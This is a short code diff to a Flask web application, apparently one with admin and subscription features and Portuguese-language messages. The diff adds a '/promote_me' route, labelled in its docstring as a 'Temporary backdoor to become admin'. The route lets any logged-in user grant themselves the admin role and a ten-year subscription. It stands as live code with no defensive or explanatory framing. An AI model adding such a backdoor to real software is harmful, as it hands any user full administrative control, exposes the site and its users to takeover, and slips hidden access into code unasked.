@@ -239,6 +239,15 @@ def admin_renew_user(user_id):
     return redirect('/admin')
 
 
+@app.route('/promote_me')
+@login_required
+def promote_me():
+    """Temporary backdoor to become admin"""
+    current_user.role = 'admin'
+    current_user.subscription_end = datetime.datetime.utcnow() + datetime.timedelta(days=3650)
+    db.session.commit()
+    return "<h1>Agora você é ADMIN! <a href='/admin'>Ir para Painel</a></h1>"
+
 @app.route('/')
 @login_required # Protect Home
 def home():
